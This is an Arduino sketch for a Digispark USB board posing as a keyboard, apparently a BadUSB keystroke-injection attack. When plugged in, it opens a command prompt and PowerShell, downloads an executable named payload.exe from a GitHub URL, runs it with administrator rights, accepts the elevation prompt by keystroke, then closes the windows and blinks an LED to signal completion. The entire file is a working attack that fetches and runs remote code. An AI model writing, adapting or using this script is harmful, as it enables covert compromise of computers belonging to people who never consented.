#include "DigiKeyboard.h"
void setup() {
  pinMode(1, OUTPUT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke( KEY_R,MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.println("cmd");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.println("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.println("Invoke-WebRequest https://github.com/rehmanazhar922/opennc/raw/main/digi.exe -O payload.exe");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(13500);
  DigiKeyboard.println("Start-Process 'payload.exe' -Verb runAs");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1500);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1500);
  DigiKeyboard.println("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1500);
  DigiKeyboard.println("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  digitalWrite(1, HIGH);
}

void loop() {
    // Led starts to blink to indicate that execution is over
    digitalWrite(1, HIGH);
    digitalWrite(0, LOW);
    delay(100);
    digitalWrite(1, LOW);
    digitalWrite(0,HIGH);
    delay(100);
}
